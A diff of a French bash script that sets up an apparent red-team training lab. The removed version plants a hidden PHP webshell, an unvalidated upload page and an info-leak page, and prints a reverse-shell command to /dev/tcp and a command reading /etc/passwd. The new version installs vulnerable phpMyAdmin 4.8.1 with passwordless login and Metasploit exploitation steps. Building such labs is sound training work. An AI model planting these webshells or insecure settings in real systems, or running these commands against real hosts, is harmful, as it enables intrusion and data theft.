@@ -1,16 +1,16 @@
 #!/bin/bash
 
 ###############################################################################
-# Iron4Software Red Team Lab - Vulnérabilités PHP Réalistes
-# Description: Installe des vulnérabilités cachées dans le webroot
-# Usage: sudo ./install_realistic_vulnerabilities.sh
+# Iron4Software Red Team Lab - Installation phpMyAdmin 4.8.1 Vulnérable
+# CVE-2018-12613 - Local File Inclusion → Remote Code Execution
+# Exploitation: Metasploit exploit/multi/http/phpmyadmin_lfi_rce
 ###############################################################################
 
 set -e
 
 echo "========================================================"
-echo "  Iron4Software Lab - Installation Réaliste"
-echo "  Vulnérabilités cachées à la racine web"
+echo "  Iron4Software Lab - phpMyAdmin 4.8.1 Vulnérable"
+echo "  CVE-2018-12613 - LFI → RCE"
 echo "========================================================"
 echo ""
 
@@ -20,228 +20,232 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 WEB_ROOT="/var/www/html"
-UPLOAD_DIR="$WEB_ROOT/uploads"
+PMA_DIR="$WEB_ROOT/phpmyadmin"
+PMA_VERSION="4.8.1"
+PMA_URL="https://files.phpmyadmin.net/phpMyAdmin/${PMA_VERSION}/phpMyAdmin-${PMA_VERSION}-all-languages.tar.gz"
 
-echo "[1/5] Création du répertoire uploads..."
-mkdir -p "$UPLOAD_DIR"
-chmod 777 "$UPLOAD_DIR"
-echo "✅ Uploads: $UPLOAD_DIR"
+echo "[1/8] Vérification des dépendances..."
+apt update -qq
+apt install -y wget php php-mysql php-mbstring php-zip php-gd php-json php-curl mysql-server > /dev/null 2>&1
+echo "✅ Dépendances installées"
 
-echo "[2/5] Installation test.php (Webshell RCE)..."
-cat > "$WEB_ROOT/test.php" << 'EOF'
-<?php
-// Test file - DO NOT USE IN PRODUCTION
-// Debug functionality left enabled
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
+echo "[2/8] Démarrage MySQL..."
+systemctl start mysql
+systemctl enable mysql > /dev/null 2>&1
+echo "✅ MySQL démarré"
 
-if(isset($_GET['cmd'])) {
-    header('X-Debug: Enabled');
-    echo "<pre>";
-    system($_GET['cmd']);
-    echo "</pre>";
-    exit;
-}
-?>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>System Test</title>
-    <style>
-        body { font-family: monospace; background: #f0f0f0; padding: 20px; }
-        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 5px; }
-        input[type="text"] { width: 70%; padding: 10px; }
-        input[type="submit"] { padding: 10px 20px; background: #333; color: white; border: none; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>System Test Panel</h2>
-        <p><em>Internal testing only</em></p>
-        <form method="GET">
-            <input type="text" name="cmd" placeholder="Command">
-            <input type="submit" value="Execute">
-        </form>
-    </div>
-</body>
-</html>
-EOF
+echo "[3/8] Configuration MySQL..."
+# Créer un utilisateur MySQL pour phpMyAdmin
+mysql -e "CREATE USER IF NOT EXISTS 'pma'@'localhost' IDENTIFIED BY 'pmapass';" 2>/dev/null || true
+mysql -e "GRANT ALL PRIVILEGES ON *.* TO 'pma'@'localhost' WITH GRANT OPTION;" 2>/dev/null || true
+mysql -e "FLUSH PRIVILEGES;" 2>/dev/null || true
+echo "✅ Utilisateur MySQL créé (pma:pmapass)"
 
-chmod 644 "$WEB_ROOT/test.php"
-echo "✅ test.php créé (Webshell RCE caché)"
+echo "[4/8] Téléchargement phpMyAdmin ${PMA_VERSION}..."
+cd /tmp
+if [ -f "phpMyAdmin-${PMA_VERSION}.tar.gz" ]; then
+    rm -f "phpMyAdmin-${PMA_VERSION}.tar.gz"
+fi
+wget -q "$PMA_URL" -O "phpMyAdmin-${PMA_VERSION}.tar.gz"
+echo "✅ phpMyAdmin téléchargé"
 
-echo "[3/5] Installation backup.php (Upload vulnérable)..."
-cat > "$WEB_ROOT/backup.php" << 'EOF'
-<?php
-// Backup utility - Upload files for backup
-$upload_status = '';
-
-if(isset($_FILES['file'])) {
-    $target = "/var/www/html/uploads/" . basename($_FILES['file']['name']);
-    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
-        $upload_status = "File uploaded: /uploads/" . basename($_FILES['file']['name']);
-    } else {
-        $upload_status = "Upload failed";
-    }
-}
-?>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Backup Utility</title>
-    <style>
-        body { font-family: Arial; background: #e9ecef; padding: 20px; }
-        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 5px; }
-        h2 { color: #333; }
-        .status { padding: 10px; background: #d4edda; border-radius: 3px; margin: 15px 0; }
-        input[type="file"] { padding: 10px; }
-        input[type="submit"] { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>📦 Backup Utility</h2>
-        <p>Upload files for system backup</p>
-        
-        <?php if($upload_status): ?>
-        <div class="status"><?php echo $upload_status; ?></div>
-        <?php endif; ?>
-        
-        <form method="POST" enctype="multipart/form-data">
-            <input type="file" name="file" required>
-            <input type="submit" value="Upload">
-        </form>
-        
-        <p style="margin-top: 20px; font-size: 0.9em; color: #666;">
-            <em>Note: Files are stored in /uploads/ directory</em>
-        </p>
-    </div>
-</body>
-</html>
-EOF
-
-chmod 644 "$WEB_ROOT/backup.php"
-echo "✅ backup.php créé (Upload sans validation)"
-
-echo "[4/5] Installation check.php (Info disclosure)..."
-cat > "$WEB_ROOT/check.php" << 'EOF'
-<?php
-// System health check
-header('X-Powered-By: PHP/' . phpversion());
-?>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>System Check</title>
-    <style>
-        body { font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; }
-        .info { background: #2d2d2d; padding: 15px; margin: 10px 0; border-left: 3px solid #00ff00; }
-    </style>
-</head>
-<body>
-    <h1>🔧 System Health Check</h1>
-    
-    <div class="info">
-        <strong>PHP Version:</strong> <?php echo phpversion(); ?>
-    </div>
-    
-    <div class="info">
-        <strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?>
-    </div>
-    
-    <div class="info">
-        <strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT']; ?>
-    </div>
-    
-    <div class="info">
-        <strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR']; ?>
-    </div>
-    
-    <div class="info">
-        <strong>PHP User:</strong> <?php echo get_current_user(); ?>
-    </div>
-    
-    <h2>System Status: ✅ Operational</h2>
-</body>
-</html>
-EOF
-
-chmod 644 "$WEB_ROOT/check.php"
-echo "✅ check.php créé (Info disclosure)"
-
-echo "[5/5] Nettoyage du dossier /lab/ si existant..."
-if [ -d "$WEB_ROOT/lab" ]; then
-    rm -rf "$WEB_ROOT/lab"
-    echo "✅ Dossier /lab/ supprimé"
+echo "[5/8] Extraction et installation..."
+if [ -d "$PMA_DIR" ]; then
+    echo "⚠️  Suppression de l'ancien phpMyAdmin..."
+    rm -rf "$PMA_DIR"
 fi
 
-chown -R www-data:www-data "$WEB_ROOT"
+tar -xzf "phpMyAdmin-${PMA_VERSION}.tar.gz" -C /tmp/
+mv "/tmp/phpMyAdmin-${PMA_VERSION}-all-languages" "$PMA_DIR"
+echo "✅ phpMyAdmin extrait dans $PMA_DIR"
+
+echo "[6/8] Configuration phpMyAdmin..."
+cd "$PMA_DIR"
+cp config.sample.inc.php config.inc.php
+
+# Générer un blowfish secret
+BLOWFISH_SECRET=$(openssl rand -base64 32 | tr -d "=+/" | cut -c1-32)
+
+# Configurer config.inc.php
+cat > config.inc.php << EOF
+<?php
+\$cfg['blowfish_secret'] = '${BLOWFISH_SECRET}';
+
+\$i = 0;
+\$i++;
+
+\$cfg['Servers'][\$i]['auth_type'] = 'cookie';
+\$cfg['Servers'][\$i]['host'] = 'localhost';
+\$cfg['Servers'][\$i]['compress'] = false;
+\$cfg['Servers'][\$i]['AllowNoPassword'] = true;
+
+\$cfg['UploadDir'] = '';
+\$cfg['SaveDir'] = '';
+
+// VULNERABLE CONFIGURATION - DO NOT USE IN PRODUCTION
+\$cfg['AllowArbitraryServer'] = true;
+?>
+EOF
+
+echo "✅ Configuration phpMyAdmin créée"
+
+echo "[7/8] Permissions..."
+mkdir -p "$PMA_DIR/tmp"
+chown -R www-data:www-data "$PMA_DIR"
+chmod -R 755 "$PMA_DIR"
+chmod 777 "$PMA_DIR/tmp"
 echo "✅ Permissions configurées"
 
+echo "[8/8] Création de la page d'information..."
+cat > "$WEB_ROOT/info.html" << 'EOF'
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iron4Software - Infrastructure Info</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 12px;
+            padding: 40px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #2c3e50;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 15px;
+        }
+        .service {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid #667eea;
+            border-radius: 4px;
+        }
+        a {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 10px 20px;
+            background: #667eea;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+        }
+        a:hover { background: #764ba2; }
+        .warning {
+            background: #ffe6e6;
+            border-left: 4px solid #e74c3c;
+            padding: 15px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🏢 Iron4Software - Services Internes</h1>
+        
+        <div class="service">
+            <h3>📧 Webmail</h3>
+            <p>Service de messagerie Roundcube pour les employés.</p>
+            <a href="/">Accéder au Webmail</a>
+        </div>
+
+        <div class="service">
+            <h3>🗄️ phpMyAdmin</h3>
+            <p>Interface d'administration des bases de données.</p>
+            <a href="/phpmyadmin/">Accéder à phpMyAdmin</a>
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ Accès Réservé</strong><br>
+            Ces services sont réservés au personnel autorisé d'Iron4Software.
+        </div>
+    </div>
+</body>
+</html>
+EOF
+
+chmod 644 "$WEB_ROOT/info.html"
+echo "✅ Page d'information créée"
+
+# Informations serveur
 SERVER_IP=$(hostname -I | awk '{print $1}')
 HOSTNAME=$(hostname)
 
 echo ""
 echo "========================================================"
-echo "  ✅ Installation réaliste terminée !"
+echo "  ✅ Installation terminée avec succès !"
 echo "========================================================"
 echo ""
 echo "📊 Configuration :"
-echo "   Hostname  : $HOSTNAME"
-echo "   IP        : $SERVER_IP"
-echo "   Web Root  : $WEB_ROOT"
+echo "   Hostname       : $HOSTNAME"
+echo "   IP             : $SERVER_IP"
+echo "   phpMyAdmin     : $PMA_DIR"
+echo "   Version        : $PMA_VERSION"
 echo ""
-echo "🎯 Vulnérabilités installées (noms réalistes) :"
-echo "   1. test.php    - Webshell RCE (fichier de test oublié)"
-echo "   2. backup.php  - Upload non sécurisé (utilitaire backup)"
-echo "   3. check.php   - Info disclosure (health check)"
-echo "   4. /uploads/   - Répertoire d'upload accessible"
+echo "🔐 Credentials MySQL :"
+echo "   User           : pma"
+echo "   Password       : pmapass"
+echo "   (ou connexion sans mot de passe activée)"
 echo ""
-echo "🔍 Découverte (Fuzzing requis) :"
-echo "   gobuster dir -u http://$SERVER_IP/ -w wordlist.txt"
-echo "   dirbuster, dirb, ffuf..."
+echo "🎯 Vulnérabilité :"
+echo "   CVE            : CVE-2018-12613"
+echo "   Type           : Local File Inclusion → RCE"
+echo "   Exploit MSF    : exploit/multi/http/phpmyadmin_lfi_rce"
 echo ""
-echo "🧪 Tests locaux :"
-echo "   curl http://localhost/test.php"
-echo "   curl 'http://localhost/test.php?cmd=id'"
-echo "   curl http://localhost/backup.php"
-echo "   curl http://localhost/check.php"
+echo "🌐 URLs d'accès :"
+echo "   Info page      : http://$SERVER_IP/info.html"
+echo "   phpMyAdmin     : http://$SERVER_IP/phpmyadmin/"
+echo "   Webmail        : http://$SERVER_IP/"
+echo ""
+echo "🧪 Test local :"
+echo "   curl http://localhost/phpmyadmin/"
+echo ""
+
+# Test
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost/phpmyadmin/ 2>/dev/null || echo "000")
+
+if [ "$HTTP_CODE" = "200" ]; then
+    echo "✅ phpMyAdmin accessible (HTTP 200)"
+else
+    echo "⚠️  phpMyAdmin ne répond pas (HTTP $HTTP_CODE)"
+fi
+
 echo ""
 echo "========================================================"
-echo "  🔥 EXPLOITATION DEPUIS KALI"
+echo "  🔥 EXPLOITATION AVEC METASPLOIT"
 echo "========================================================"
 echo ""
-echo "1️⃣  Fuzzing / Découverte :"
-echo "    gobuster dir -u http://mail.iron4software.local/ -w /usr/share/wordlists/dirb/common.txt"
-echo "    # Trouve: test.php, backup.php, check.php"
+echo "1️⃣  Vérifier l'accès depuis Kali :"
+echo "    curl http://mail.iron4software.local/phpmyadmin/"
 echo ""
 echo "2️⃣  Reconnaissance :"
-echo "    curl http://mail.iron4software.local/check.php"
-echo "    # Info: PHP version, serveur, user"
+echo "    nmap -sV -p 80 --script http-enum mail.iron4software.local"
 echo ""
-echo "3️⃣  Exploitation RCE (test.php) :"
-echo "    curl 'http://mail.iron4software.local/test.php?cmd=whoami'"
-echo "    curl 'http://mail.iron4software.local/test.php?cmd=id'"
-echo "    curl 'http://mail.iron4software.local/test.php?cmd=cat%20/etc/passwd'"
-echo ""
-echo "4️⃣  Upload webshell (backup.php) :"
-echo "    echo '<?php system(\$_GET[\"x\"]); ?>' > shell.php"
-echo "    curl -F 'file=@shell.php' http://mail.iron4software.local/backup.php"
-echo "    curl 'http://mail.iron4software.local/uploads/shell.php?x=id'"
-echo ""
-echo "5️⃣  Reverse shell :"
-echo "    # Sur Kali: nc -lvnp 4444"
-echo "    curl 'http://mail.iron4software.local/test.php?cmd=bash%20-c%20\"bash%20-i%20>%26%20/dev/tcp/192.168.100.10/4444%200>%261\"'"
-echo ""
-echo "6️⃣  Metasploit (PHP-FPM RCE) :"
+echo "3️⃣  Exploitation Metasploit :"
 echo "    msfconsole -q"
-echo "    use exploit/multi/http/php_fpm_rce"
+echo "    use exploit/multi/http/phpmyadmin_lfi_rce"
 echo "    set RHOSTS mail.iron4software.local"
+echo "    set TARGETURI /phpmyadmin/"
 echo "    set LHOST 192.168.100.10"
 echo "    set LPORT 4444"
 echo "    check"
 echo "    exploit"
 echo ""
+echo "4️⃣  Shell Meterpreter attendu :"
+echo "    meterpreter > sysinfo"
+echo "    meterpreter > getuid"
+echo "    meterpreter > shell"
+echo ""
 echo "========================================================"
-echo "  🛡️ Lab Iron4Software - Configuration Réaliste"
+echo "  🛡️ phpMyAdmin 4.8.1 Vulnérable - Prêt pour Red Team"
 echo "========================================================"
